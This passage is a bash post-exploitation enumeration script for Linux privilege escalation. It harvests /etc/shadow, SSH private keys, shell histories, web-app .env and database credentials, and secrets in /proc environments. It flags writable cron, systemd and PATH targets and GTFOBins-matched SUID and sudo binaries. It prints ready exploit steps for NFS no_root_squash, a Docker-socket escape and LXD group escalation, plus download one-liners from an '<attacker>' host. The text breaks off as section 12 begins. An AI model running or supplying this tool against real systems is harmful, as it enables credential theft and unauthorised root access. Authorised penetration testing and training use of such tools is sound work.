#!/bin/bash
# =============================================================================
#  linux_enum.sh — Linux Privilege Escalation Enumeration Script
#  Compatible with: Debian, Ubuntu, RHEL, CentOS, Fedora, Arch, Alpine, etc.
#
#  USAGE:
#    ./linux_enum.sh              → saves all section files to ./enum_<host>_<date>/
#    ./linux_enum.sh -o /tmp/out  → saves to custom directory
#    ./linux_enum.sh -q           → quiet mode (no terminal output, files only)
#    ./linux_enum.sh -h           → help
# =============================================================================

# ──────────────────────────────────────────────
#  ARGUMENT PARSING
# ──────────────────────────────────────────────
OUTDIR=""
QUIET=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        -o) OUTDIR="$2"; shift 2 ;;
        -q) QUIET=1; shift ;;
        -h|--help)
            echo "Usage: $0 [-o output_dir] [-q]"
            echo "  -o DIR   Save section files to DIR (default: ./enum_<host>_<date>)"
            echo "  -q       Quiet — write files only, suppress terminal output"
            exit 0 ;;
        *) shift ;;
    esac
done

# ──────────────────────────────────────────────
#  COLOUR HELPERS
# ──────────────────────────────────────────────
if [ "$QUIET" -eq 0 ]; then
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; RESET=''
fi

banner()  { [ "$QUIET" -eq 0 ] && echo -e "\n${CYAN}${BOLD}══════════════════════════════════════════${RESET}\n${CYAN}${BOLD}  $1${RESET}\n${CYAN}${BOLD}══════════════════════════════════════════${RESET}"; }
section() { [ "$QUIET" -eq 0 ] && echo -e "\n${YELLOW}${BOLD}▶ $1${RESET}"; }
info()    { [ "$QUIET" -eq 0 ] && echo -e "  ${GREEN}[+]${RESET} $1"; }
warn()    { [ "$QUIET" -eq 0 ] && echo -e "  ${RED}[!]${RESET} $1"; }
tprint()  { [ "$QUIET" -eq 0 ] && echo -e "$1"; }

# ──────────────────────────────────────────────
#  OUTPUT DIRECTORY SETUP
# ──────────────────────────────────────────────
HOST=$(hostname 2>/dev/null || echo "unknown")
DATE=$(date +"%Y%m%d_%H%M%S")
[ -z "$OUTDIR" ] && OUTDIR="./enum_${HOST}_${DATE}"

mkdir -p "$OUTDIR" 2>/dev/null
if [ ! -d "$OUTDIR" ]; then
    echo "[-] ERROR: Cannot create output directory: $OUTDIR" >&2
    exit 1
fi

# ──────────────────────────────────────────────
#  CORE HELPERS
# ──────────────────────────────────────────────
SEC_FILE=""

begin_section() {
    local fname="$1" title="$2"
    SEC_FILE="${OUTDIR}/${fname}.txt"
    {
        echo "========================================================"
        echo "  $title"
        echo "  Generated : $(date)"
        echo "  Host      : ${HOST}"
        echo "  User      : $(whoami 2>/dev/null) [uid=$(id -u) gid=$(id -g)]"
        echo "========================================================"
        echo ""
    } > "$SEC_FILE"
    banner "$title"
}

end_section() {
    info "Saved → ${SEC_FILE}"
    tprint ""
}

# Run command, write labelled block to file + terminal
cap() {
    local label="$1" cmd="$2"
    local result
    result=$(eval "$cmd" 2>/dev/null)
    [ -z "$result" ] && return
    { echo "-------- ${label} --------"; echo "$result"; echo ""; } >> "$SEC_FILE"
    section "$label"
    echo "$result" | sed 's/^/    /'
}

# Write note to file + terminal
note() {
    local tag="$1" msg="$2"
    echo "${tag} ${msg}" >> "$SEC_FILE"
    [ "$tag" = "[!]" ] && warn "$msg" || info "$msg"
}

# Write a file's content to the section file with a header label
capfile() {
    local label="$1" filepath="$2"
    [ -f "$filepath" ] || return
    { echo "-------- ${label} : ${filepath} --------"; cat "$filepath" 2>/dev/null; echo ""; } >> "$SEC_FILE"
    [ "$QUIET" -eq 0 ] && section "$label: $filepath" && cat "$filepath" 2>/dev/null | sed 's/^/    /'
}

# ──────────────────────────────────────────────
#  MASTER SUMMARY FILE
# ──────────────────────────────────────────────
SUMMARY="${OUTDIR}/00_summary.txt"
KERNEL=$(uname -r)
ARCH=$(uname -m)
{
    echo "========================================================"
    echo "  LINUX ENUMERATION — MASTER SUMMARY"
    echo "  Host    : ${HOST}"
    echo "  Date    : $(date)"
    echo "  User    : $(whoami 2>/dev/null)  uid=$(id -u)"
    echo "  Kernel  : ${KERNEL}"
    echo "  Arch    : ${ARCH}"
    echo "========================================================"
    echo ""
    echo "Section files written to: ${OUTDIR}/"
    echo ""
} > "$SUMMARY"

banner "LINUX ENUMERATION SCRIPT — Full Coverage Edition"
tprint "  ${BOLD}Output Dir :${RESET} ${OUTDIR}"
tprint "  ${BOLD}Host       :${RESET} ${HOST}"
tprint "  ${BOLD}Date       :${RESET} $(date)"
tprint "  ${BOLD}User       :${RESET} $(whoami 2>/dev/null) [uid=$(id -u)]"
tprint "  ${BOLD}Kernel     :${RESET} ${KERNEL}  (${ARCH})"
tprint ""

# ══════════════════════════════════════════════
#  SECTION 01 — OPERATING SYSTEM
# ══════════════════════════════════════════════
begin_section "01_os_info" "1. OPERATING SYSTEM"

section "Distribution & Version"
{
    echo "-------- Distribution & Version --------"
    for f in /etc/issue /etc/os-release /etc/lsb-release /etc/redhat-release \
              /etc/debian_version /etc/alpine-release /etc/arch-release \
              /etc/gentoo-release /etc/SuSE-release; do
        [ -f "$f" ] && { echo "## $f"; cat "$f" 2>/dev/null; echo ""; info "$f"; }
    done
} >> "$SEC_FILE"

cap "Kernel Version"        "uname -a"
cap "Kernel (proc)"         "cat /proc/version"
cap "Boot Kernels"          "ls /boot 2>/dev/null | grep -i vmlinuz"
cap "CPU Info"              "cat /proc/cpuinfo | grep -E 'model name|cpu MHz|cache size|cpu cores' | sort -u"
cap "Memory Info"           "cat /proc/meminfo | head -20"
cap "Disk Usage"            "df -h"
cap "Uptime"                "uptime"
cap "Environment Variables" "env"

section "Shell Config Files"
for f in /etc/profile /etc/bashrc /etc/environment \
          ~/.bash_profile ~/.bashrc ~/.bash_logout ~/.zshrc ~/.profile; do
    [ -f "$f" ] && { { echo "-------- $f --------"; cat "$f" 2>/dev/null; echo ""; } >> "$SEC_FILE"; info "$f"; }
done

cap "Printer (lpstat)"      "lpstat -a"
[ -f /etc/cups/cupsd.conf ] && { capfile "CUPS Config" /etc/cups/cupsd.conf; note "[!]" "CUPS config found"; }

end_section

# ══════════════════════════════════════════════
#  SECTION 02 — CURRENT USER & PRIVILEGES
# ══════════════════════════════════════════════
begin_section "02_user_info" "2. CURRENT USER & PRIVILEGES"

cap "Identity (id)"          "id"
cap "Whoami"                 "whoami"
cap "Sudo Privileges"        "sudo -l"
cap "Sudoers File"           "cat /etc/sudoers"
cap "Sudoers.d"              "ls -la /etc/sudoers.d/ && cat /etc/sudoers.d/* 2>/dev/null"
cap "Super Users (UID 0)"    "awk -F: '(\$3==\"0\"){print}' /etc/passwd"
cap "All Users"              "cat /etc/passwd"
cap "All Groups"             "cat /etc/group"
cap "Current Groups"         "groups"
cap "Logged-in Users (who)"  "who"
cap "Logged-in Users (w)"    "w"
cap "Login History (last)"   "last | head -30"
cap "Failed Logins"          "lastb 2>/dev/null | head -20"
cap "Password Policy"        "chage -l \$(whoami) 2>/dev/null"
cap "Shadow File"            "cat /etc/shadow"
cap "GShadow File"           "cat /etc/gshadow"

# ── Sensitive file permission checks ──────────
section "Sensitive File Permission Checks"
{
    echo "-------- Sensitive File Write Permissions --------"
    for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts \
              /etc/hostname /etc/resolv.conf /etc/bash.bashrc /etc/profile; do
        if [ -f "$f" ]; then
            perms=$(ls -la "$f" 2>/dev/null)
            if [ -w "$f" ]; then
                echo "[!!] WRITABLE BY CURRENT USER: $perms"
                warn "WRITABLE: $f  ← DIRECT PRIVESC VECTOR"
            else
                echo "[ ] $perms"
            fi
        fi
    done
    echo ""
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 03 — APPLICATIONS & SERVICES
# ══════════════════════════════════════════════
begin_section "03_services_apps" "3. APPLICATIONS & SERVICES"

cap "Running Processes"      "ps aux"
cap "Root Processes"         "ps aux | grep root | grep -v grep"
cap "Process Tree"           "pstree 2>/dev/null || ps auxf 2>/dev/null"

# ── Passwords in process arguments ────────────
section "Passwords in Process Arguments"
{
    echo "-------- Password Keywords in Process Args --------"
    result=$(ps aux 2>/dev/null | grep -iE '\-p(ass)?|\-\-pass(word)?|password=|passwd=|pwd=' | grep -v grep)
    if [ -n "$result" ]; then
        echo "[!!] POSSIBLE CREDENTIALS IN PROCESS ARGS:"
        echo "$result"
        warn "Possible credentials found in process arguments!"
    else
        echo "[+] No obvious password flags found in process args"
    fi
    echo ""
} >> "$SEC_FILE"

section "Installed Packages"
{
    echo "-------- Installed Packages --------"
    if command -v dpkg &>/dev/null; then
        echo "## dpkg (Debian/Ubuntu)"; dpkg -l 2>/dev/null
    elif command -v rpm &>/dev/null; then
        echo "## rpm (RHEL/CentOS/Fedora)"; rpm -qa 2>/dev/null
    elif command -v pacman &>/dev/null; then
        echo "## pacman (Arch)"; pacman -Q 2>/dev/null
    elif command -v apk &>/dev/null; then
        echo "## apk (Alpine)"; apk info 2>/dev/null
    fi
    echo ""
} >> "$SEC_FILE"

section "Useful Binaries"
{
    echo "-------- Useful Binaries --------"
    for bin in wget curl nc netcat ncat python python3 perl ruby gcc cc g++ \
               make socat tftp ftp scp rsync git strace ltrace gdb awk sed \
               vim vi nano base64 xxd zip unzip tar nmap tcpdump screen tmux \
               openssl jq mysql psql sqlite3 mongo redis-cli; do
        path=$(command -v "$bin" 2>/dev/null)
        [ -n "$path" ] && echo "[+] $path" && info "Found: $path"
    done
    echo ""
} >> "$SEC_FILE"

cap "Scheduled Jobs (crontab)" "crontab -l"
cap "All Users Crontabs"       "for u in \$(cut -d: -f1 /etc/passwd); do echo \"=== \$u ===\"; crontab -u \$u -l 2>/dev/null; done"
cap "Cron Spool"               "ls -alh /var/spool/cron/ 2>/dev/null"
cap "Cron Files"               "ls -alh /etc/cron* 2>/dev/null"

for f in /etc/crontab /etc/anacrontab /etc/at.allow /etc/at.deny \
          /etc/cron.allow /etc/cron.deny /var/spool/cron/crontabs/root; do
    [ -f "$f" ] && { echo "-------- $f --------"; cat "$f" 2>/dev/null; echo ""; } >> "$SEC_FILE"
done

# ── Writable scripts called by cron ───────────
section "Cron Script Writability Check"
{
    echo "-------- Scripts Called by Cron (Writable?) --------"
    for cronfile in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
        [ -f "$cronfile" ] || continue
        grep -Eo '(/[a-zA-Z0-9_./-]+\.(sh|py|pl|rb))' "$cronfile" 2>/dev/null | while read -r script; do
            if [ -f "$script" ]; then
                if [ -w "$script" ]; then
                    echo "[!!] WRITABLE CRON SCRIPT: $script  (called from $cronfile)"
                    warn "WRITABLE cron script: $script"
                else
                    echo "[ ] Not writable: $script"
                fi
            fi
        done
    done
    echo ""
} >> "$SEC_FILE"

cap "Systemd Timers"           "systemctl list-timers --all"

# ── Writable systemd unit files ───────────────
section "Writable Systemd Unit Files"
{
    echo "-------- Writable Systemd Unit Files --------"
    found=0
    for dir in /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system; do
        [ -d "$dir" ] || continue
        find "$dir" -name "*.service" -writable 2>/dev/null | while read -r unit; do
            echo "[!!] WRITABLE UNIT FILE: $unit"
            warn "WRITABLE systemd unit: $unit"
            found=1
        done
    done
    [ "$found" -eq 0 ] && echo "[+] No writable systemd unit files found"
    echo ""
} >> "$SEC_FILE"

cap "Systemd Services"         "systemctl list-units --type=service --all 2>/dev/null"

section "Service Config Files (Misconfigs)"
{
    echo "-------- Service Config Files --------"
    for f in /etc/syslog.conf /etc/lighttpd.conf /etc/inetd.conf \
              /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf \
              /etc/my.cnf /etc/mysql/my.cnf /etc/nginx/nginx.conf \
              /opt/lampp/etc/httpd.conf /etc/vsftpd.conf /etc/pure-ftpd.conf \
              /etc/proftpd.conf /etc/ssh/sshd_config /etc/redis/redis.conf; do
        [ -f "$f" ] && { echo "## $f (first 40 lines)"; head -40 "$f" 2>/dev/null; echo ""; warn "Found: $f"; }
    done
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 04 — NETWORKING
# ══════════════════════════════════════════════
begin_section "04_network_info" "4. NETWORKING"

if command -v ip &>/dev/null; then
    cap "Network Interfaces (ip)"   "ip a"
    cap "Routing Table (ip)"        "ip route"
    cap "Neighbours (ARP via ip)"   "ip neigh"
else
    cap "Network Interfaces"        "/sbin/ifconfig -a"
    cap "Routing Table"             "route -n"
    cap "ARP Cache"                 "arp -e 2>/dev/null || arp -a"
fi

cap "Route (extended)"              "/sbin/route -nee"

if command -v ss &>/dev/null; then
    cap "Open Ports (ss)"           "ss -tulpn"
    cap "All Connections (ss)"      "ss -anp"
elif command -v netstat &>/dev/null; then
    cap "Open Ports (netstat)"      "netstat -antup"
    cap "Listening (netstat)"       "netstat -tulpn"
fi

# ── Internal hosts / pivot targets ────────────
section "Internal Network Hosts (Pivot Targets)"
{
    echo "-------- Active Connections to Other Hosts --------"
    if command -v ss &>/dev/null; then
        ss -ant 2>/dev/null | grep ESTAB
    else
        netstat -ant 2>/dev/null | grep ESTABLISHED
    fi
    echo ""
    echo "-------- ARP Table (Known LAN Hosts) --------"
    arp -a 2>/dev/null || ip neigh 2>/dev/null
    echo ""
    echo "-------- /etc/hosts (Static Entries) --------"
    cat /etc/hosts 2>/dev/null
    echo ""
    echo "-------- Known SSH Hosts --------"
    cat ~/.ssh/known_hosts 2>/dev/null
    cat /etc/ssh/ssh_known_hosts 2>/dev/null
    echo ""
} >> "$SEC_FILE"

cap "Open Files / Sockets (lsof)"   "lsof -i"
cap "DNS Resolver"                  "cat /etc/resolv.conf"
cap "Hostname / Domain"             "hostname && dnsdomainname"
cap "Firewall (iptables)"           "iptables -L -n -v"
cap "NAT Rules"                     "iptables -t nat -L -n -v"
cap "nftables"                      "nft list ruleset"
cap "Services at Boot (systemctl)"  "systemctl list-unit-files --type=service 2>/dev/null | grep enabled"
cap "Services at Boot (chkconfig)"  "chkconfig --list 2>/dev/null | grep '3:on'"
cap "tcpdump available"             "which tcpdump && tcpdump --version 2>&1 | head -2"

for f in /etc/network/interfaces /etc/sysconfig/network /etc/networks; do
    [ -f "$f" ] && { echo "-------- $f --------"; cat "$f" 2>/dev/null; echo ""; } >> "$SEC_FILE"
done

end_section

# ══════════════════════════════════════════════
#  SECTION 05 — NFS SHARES
# ══════════════════════════════════════════════
begin_section "05_nfs_shares" "5. NFS SHARES"

cap "NFS Exports (/etc/exports)"    "cat /etc/exports"
cap "Mounted NFS Shares"            "mount | grep nfs"
cap "Showmount (exported shares)"   "showmount -e localhost 2>/dev/null"
cap "NFS Config (/etc/nfs.conf)"    "cat /etc/nfs.conf 2>/dev/null"
cap "rpcinfo"                       "rpcinfo -p 2>/dev/null"

section "no_root_squash Check"
{
    echo "-------- no_root_squash / no_all_squash Detection --------"
    if [ -f /etc/exports ]; then
        result=$(grep -E 'no_root_squash|no_all_squash' /etc/exports 2>/dev/null)
        if [ -n "$result" ]; then
            echo "[!!] DANGEROUS NFS EXPORT OPTIONS FOUND:"
            echo "$result"
            warn "no_root_squash or no_all_squash found in /etc/exports — NFS privesc possible!"
        else
            echo "[+] No no_root_squash found in /etc/exports"
        fi
    else
        echo "[+] /etc/exports does not exist"
    fi
    echo ""
    echo "---- Exploitation Hint ----"
    echo "If no_root_squash is set, mount the share as root on attacker box:"
    echo "  mount -t nfs <target_ip>:/share /mnt/nfs"
    echo "  cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash"
    echo "  On target: /share/bash -p"
    echo ""
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 06 — SENSITIVE FILES & CREDENTIALS
# ══════════════════════════════════════════════
begin_section "06_credentials" "6. SENSITIVE FILES & CREDENTIALS"

cap "passwd"             "cat /etc/passwd"
cap "shadow"             "cat /etc/shadow"
cap "group"              "cat /etc/group"
cap "gshadow"            "cat /etc/gshadow"
cap "Mail Directory"     "ls -alh /var/mail/"
cap "Mail Spool (root)"  "cat /var/spool/mail/root 2>/dev/null; cat /var/mail/root 2>/dev/null"
cap "Home Directories"   "ls -ahlR /home/ 2>/dev/null"
cap "Root Home"          "ls -ahlR /root/ 2>/dev/null"

section "Shell Histories"
{
    echo "-------- Shell Histories --------"
    for hist in ~/.bash_history ~/.zsh_history ~/.nano_history ~/.mysql_history \
                ~/.php_history ~/.atftp_history ~/.python_history ~/.sh_history \
                ~/.psql_history ~/.irb_history; do
        if [ -f "$hist" ]; then
            echo "## $hist (last 50 lines)"
            tail -50 "$hist" 2>/dev/null
            echo ""
            warn "Found: $hist"
        fi
    done
    # all users histories
    for user_home in /home/* /root; do
        for hist in "$user_home"/.bash_history "$user_home"/.zsh_history; do
            if [ -f "$hist" ] && [ -r "$hist" ]; then
                echo "## $hist (last 20 lines)"; tail -20 "$hist" 2>/dev/null; echo ""
            fi
        done
    done
} >> "$SEC_FILE"

section "SSH Keys & Config"
{
    echo "-------- SSH Keys & Config --------"
    for f in ~/.ssh/authorized_keys ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa \
              ~/.ssh/id_ed25519 ~/.ssh/identity /etc/ssh/sshd_config \
              /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_dsa_key \
              /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_dsa_key.pub; do
        [ -f "$f" ] && { echo "## $f"; cat "$f" 2>/dev/null; echo ""; warn "Found: $f"; }
    done
    echo "## ~/.ssh/ listing"; ls -la ~/.ssh/ 2>/dev/null; echo ""
    # check other users' .ssh dirs
    for user_home in /home/* /root; do
        [ -d "$user_home/.ssh" ] && { echo "## $user_home/.ssh/"; ls -la "$user_home/.ssh/" 2>/dev/null; echo ""; }
    done
} >> "$SEC_FILE"

section "Database / App Credentials"
{
    echo "-------- DB / App Credential Files --------"
    for f in /var/lib/mysql/mysql/user.MYD /root/anaconda-ks.cfg \
              /var/apache2/config.inc /var/www/html/wp-config.php \
              /var/www/html/config.php /etc/phpmyadmin/config.inc.php \
              /var/www/html/.env /var/www/.env /opt/.env ~/.my.cnf \
              ~/.pgpass /etc/mysql/debian.cnf; do
        [ -f "$f" ] && { echo "## $f"; cat "$f" 2>/dev/null; echo ""; warn "Found: $f"; }
    done
} >> "$SEC_FILE"

cap "Config Files w/ 'password'"     "grep -rli 'password' /etc/ 2>/dev/null | head -15"
cap "Credential keywords (web/opt)"  "grep -rl 'password\|passwd\|secret\|api_key\|token\|DB_PASS\|DB_USER' /var/www /opt /srv /home 2>/dev/null | head -20"

section "Web Roots"
{
    echo "-------- Web Root Listings --------"
    for d in /var/www/html /var/www /srv/www/htdocs \
              /usr/local/www/apache22/data /opt/lampp/htdocs; do
        [ -d "$d" ] && { echo "## $d"; ls -alhR "$d" 2>/dev/null | head -30; echo ""; info "Web root: $d"; }
    done
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 07 — FILE SYSTEM & PERMISSIONS
# ══════════════════════════════════════════════
begin_section "07_filesystem_perms" "7. FILE SYSTEM & PERMISSIONS"

cap "Mounts"                        "mount | column -t"
cap "Disk Usage"                    "df -h"
cap "fstab"                         "cat /etc/fstab"
cap "SUID Binaries"                 "find / -perm -u=s -type f 2>/dev/null"
cap "SGID Binaries"                 "find / -perm -g=s -type f 2>/dev/null"
cap "Sticky Bit Directories"        "find / -perm -1000 -type d 2>/dev/null"
cap "World-Writable Directories"    "find / -perm -o+w -type d 2>/dev/null | grep -v proc"
cap "World-Writable Files"          "find / -perm -o+w -type f 2>/dev/null | grep -v proc | head -30"
cap "Writable /etc/ Files"          "find /etc/ -writable -type f 2>/dev/null"
cap "Files with No Owner"           "find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null | head -20"
cap "File Capabilities"             "getcap -r / 2>/dev/null"
cap "Writable Cron/Init Scripts"    "find /etc/cron* /etc/init.d /etc/init /etc/rc.d -writable -type f 2>/dev/null"

# ── PATH Hijacking ────────────────────────────
section "PATH Hijacking — Writable PATH Directories"
{
    echo "-------- Writable Directories in \$PATH --------"
    echo "Current PATH: $PATH"
    echo ""
    found=0
    IFS=':' read -ra path_dirs <<< "$PATH"
    for dir in "${path_dirs[@]}"; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "[!!] WRITABLE PATH DIRECTORY: $dir"
            ls -ald "$dir" 2>/dev/null
            warn "WRITABLE PATH DIR: $dir  ← PATH hijack possible!"
            found=1
        else
            echo "[ ] Not writable: $dir"
        fi
    done
    [ "$found" -eq 0 ] && echo "[+] No writable directories in PATH"
    echo ""
    echo "---- Exploitation Hint ----"
    echo "If a root-owned script calls a binary without full path, drop a malicious"
    echo "binary named the same into the writable PATH directory."
    echo ""
} >> "$SEC_FILE"

section "/var/ Contents"
{
    echo "-------- /var/ Contents --------"
    for d in /var/log /var/mail /var/spool /var/lib/pgsql /var/lib/mysql; do
        [ -d "$d" ] && { echo "## $d"; ls -alh "$d" 2>/dev/null | head -10; echo ""; }
    done
} >> "$SEC_FILE"

section "Log Files"
{
    echo "-------- Log Files --------"
    for f in /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages \
              /var/log/apache2/access.log /var/log/httpd/access_log \
              /var/log/apache2/error.log /var/log/httpd/error_log \
              /var/log/dpkg.log /var/log/yum.log /var/log/cups/error_log \
              /var/log/faillog /var/log/lastlog /var/log/wtmp; do
        [ -f "$f" ] && { echo "[+] $(ls -alh "$f" 2>/dev/null)"; info "Found: $f"; }
    done
    echo ""
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 08 — /proc FILESYSTEM LEAKS
# ══════════════════════════════════════════════
begin_section "08_proc_leaks" "8. /proc FILESYSTEM LEAKS"

cap "/proc/version"                 "cat /proc/version"
cap "/proc/cmdline (boot args)"     "cat /proc/cmdline"
cap "/proc/mounts"                  "cat /proc/mounts"
cap "/proc/net/tcp (open sockets)"  "cat /proc/net/tcp 2>/dev/null | head -30"
cap "/proc/net/tcp6"                "cat /proc/net/tcp6 2>/dev/null | head -20"
cap "/proc/net/udp"                 "cat /proc/net/udp 2>/dev/null | head -20"
cap "/proc/net/arp"                 "cat /proc/net/arp"
cap "/proc/net/fib_trie (subnets)"  "cat /proc/net/fib_trie 2>/dev/null | grep -E 'LOCAL|HOST' | head -20"
cap "/proc/sched_debug"             "cat /proc/sched_debug 2>/dev/null | head -30"

section "Process Environment Leaks (/proc/*/environ)"
{
    echo "-------- Readable Process Environments --------"
    count=0
    for pid in /proc/[0-9]*/environ; do
        if [ -r "$pid" ]; then
            content=$(cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|secret|key|token|api|user|db_' | head -5)
            if [ -n "$content" ]; then
                echo "[!!] Sensitive vars in $pid:"
                echo "$content"
                echo ""
                warn "Credentials found in $pid"
                count=$((count+1))
            fi
        fi
    done
    [ "$count" -eq 0 ] && echo "[+] No readable credential env vars found in /proc/*/environ"
    echo ""
    echo "---- Manual Check ----"
    echo "for pid in /proc/[0-9]*/environ; do cat \"\$pid\" 2>/dev/null | tr '\\0' '\\n'; done"
    echo ""
} >> "$SEC_FILE"

section "Readable /proc/*/cmdline"
{
    echo "-------- Process Command Lines with Possible Credentials --------"
    grep -r -l '' /proc/[0-9]*/cmdline 2>/dev/null | while read -r f; do
        line=$(cat "$f" 2>/dev/null | tr '\0' ' ')
        if echo "$line" | grep -qiE 'pass|secret|token|api.key'; then
            echo "[!!] $f: $line"
            warn "Possible credential in cmdline: $line"
        fi
    done
    echo ""
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 09 — SUID / SUDO EXPLOIT VECTORS
# ══════════════════════════════════════════════
begin_section "09_exploit_vectors" "9. SUID / SUDO EXPLOIT VECTORS (GTFOBins)"

GTFO_BINS="bash sh dash zsh ksh csh python python3 perl ruby awk gawk tclsh \
           wish expect lua node php find vim vi nano less more man tar zip \
           unzip gzip bzip2 xz cp mv cat head tail cut tee wget curl scp \
           ftp tftp nc netcat ncat socat base64 xxd env nice ionice strace \
           ltrace stdbuf dd make gcc g++ as ld git rsync arp ping traceroute \
           journalctl systemctl service apt apt-get dpkg yum rpm pacman \
           pico ed screen tmux docker lxc nmap openssl mysql psql sqlite3 \
           chmod chown chattr pip pip3 easy_install puppet ansible"

section "GTFOBins — SUID"
{
    echo "-------- GTFOBins SUID Candidates --------"
    SUID_LIST=$(find / -perm -u=s -type f 2>/dev/null)
    echo "All SUID binaries:"
    echo "$SUID_LIST"
    echo ""
    echo "---- Known-Exploitable SUID Matches ----"
    for bin in $GTFO_BINS; do
        match=$(echo "$SUID_LIST" | grep -E "/$bin$")
        if [ -n "$match" ]; then
            echo "[!!] POTENTIAL EXPLOIT (SUID): $match"
            warn "POTENTIAL EXPLOIT (SUID): $match"
        fi
    done
    echo ""
} >> "$SEC_FILE"

section "GTFOBins — Sudo"
{
    echo "-------- GTFOBins Sudo Candidates --------"
    SUDO_OUT=$(sudo -l 2>/dev/null)
    if [ -n "$SUDO_OUT" ]; then
        echo "$SUDO_OUT"
        echo ""
        echo "---- Known-Exploitable Sudo Matches ----"
        for bin in $GTFO_BINS; do
            if echo "$SUDO_OUT" | grep -q "$bin"; then
                echo "[!!] POTENTIAL EXPLOIT (SUDO): $bin"
                warn "POTENTIAL EXPLOIT (SUDO): $bin"
            fi
        done
    else
        echo "[+] sudo -l produced no output"
    fi
    echo ""
} >> "$SEC_FILE"

cap "File Capabilities"             "getcap -r / 2>/dev/null"

{
    echo "-------- Capability Exploitation Hints --------"
    cap_out=$(getcap -r / 2>/dev/null)
    if echo "$cap_out" | grep -qE 'cap_setuid|cap_net_raw|cap_dac_override|cap_sys_admin'; then
        echo "[!!] Dangerous capabilities found:"
        echo "$cap_out" | grep -E 'cap_setuid|cap_net_raw|cap_dac_override|cap_sys_admin'
        warn "Dangerous capabilities detected — check GTFOBins"
    fi
    echo ""
    echo "---- Reference ----"
    echo "https://gtfobins.github.io"
    echo "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities"
    echo ""
} >> "$SEC_FILE"

end_section

# ══════════════════════════════════════════════
#  SECTION 10 — DEVELOPMENT TOOLS & TRANSFERS
# ══════════════════════════════════════════════
begin_section "10_dev_tools" "10. DEVELOPMENT TOOLS & UPLOAD METHODS"

section "Compilers & Interpreters"
{
    echo "-------- Compilers & Interpreters --------"
    for tool in gcc g++ cc make perl python python3 ruby php node nodejs lua \
                java javac go rustc; do
        path=$(command -v "$tool" 2>/dev/null)
        if [ -n "$path" ]; then
            ver=$("$tool" --version 2>/dev/null | head -1)
            echo "[+] $tool → $path  ($ver)"
            info "$tool → $path"
        fi
    done
    echo ""
} >> "$SEC_FILE"

section "File Transfer Tools"
{
    echo "-------- File Transfer Tools --------"
    for tool in wget curl nc netcat ncat tftp ftp scp rsync \
                python python3 php perl ruby openssl; do
        path=$(command -v "$tool" 2>/dev/null)
        if [ -n "$path" ]; then
            echo "[+] $tool → $path"
            info "$tool → $path"
        fi
    done
    echo ""
    echo "---- Transfer One-Liners ----"
    echo "wget   : wget http://<attacker>/file -O /tmp/file"
    echo "curl   : curl http://<attacker>/file -o /tmp/file"
    echo "nc recv: nc -lvp 4444 > file"
    echo "nc send: nc <ip> 4444 < file"
    echo "python3: python3 -m http.server 8080"
    echo "php    : php -r '\$f=fopen(\"http://<ip>/f\",\"r\");fwrite(fopen(\"/tmp/f\",\"w\"),stream_get_contents(\$f));'"
    echo ""
} >> "$SEC_FILE"

cap "Find gcc/python/perl"          "find / -name 'gcc*' -o -name 'python*' -o -name 'perl*' 2>/dev/null | head -15"

end_section

# ══════════════════════════════════════════════
#  SECTION 11 — CONTAINERS & VIRTUALISATION
# ══════════════════════════════════════════════
begin_section "11_containers_virt" "11. CONTAINERS & VIRTUALISATION"

{
    echo "-------- Docker Container Check --------"
    if [ -f /.dockerenv ]; then
        echo "[!!] Running INSIDE a Docker container!"
        warn "Running INSIDE a Docker container!"
    fi
    if grep -q 'docker\|lxc' /proc/1/cgroup 2>/dev/null; then
        echo "[!!] cgroup indicates container environment"
        warn "cgroup indicates container environment"
    fi
    echo ""
} >> "$SEC_FILE"

cap "Docker Processes"              "docker ps -a"
cap "Docker Images"                 "docker images"
cap "Docker Socket"                 "ls -la /var/run/docker.sock"

section "Docker Socket Privesc Check"
{
    echo "-------- Docker Socket Write Access --------"
    if [ -w /var/run/docker.sock ]; then
        echo "[!!] /var/run/docker.sock is WRITABLE — container escape possible!"
        echo "Exploit: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        warn "Docker socket writable — CONTAINER ESCAPE VECTOR!"
    else
        echo "[+] /var/run/docker.sock not writable by current user"
    fi
    echo ""
} >> "$SEC_FILE"

cap "cgroup (container check)"      "cat /proc/1/cgroup | head -10"
cap "LXC List"                      "lxc list"
cap "LXD Group Check"               "id | grep -i lxd"

section "LXD Group Privesc Check"
{
    echo "-------- LXD Group Membership --------"
    if id 2>/dev/null | grep -q lxd; then
        echo "[!!] Current user is in the lxd group — privesc possible!"
        echo "Exploit: lxc init ubuntu:18.04 test -c security.privileged=true"
        echo "         lxc config device add test whatever disk source=/ path=/mnt/root recursive=true"
        echo "         lxc start test && lxc exec test /bin/sh"
        warn "User in lxd group — PRIVESC VECTOR!"
    else
        echo "[+] User is not in lxd group"
    fi
    echo ""
} >> "$SEC_FILE"

cap "Virtualisation (dmesg)"        "dmesg 2>/dev/null | grep -i virtual | head -5"
cap "Hypervisor (cpuinfo)"          "cat /proc/cpuinfo 2>/dev/null | grep hypervisor"
cap "systemd-detect-virt"           "systemd-detect-virt"

end_section

# ══════════════════════════════════════════════
#  SECTION 12 — INTERESTING FILES
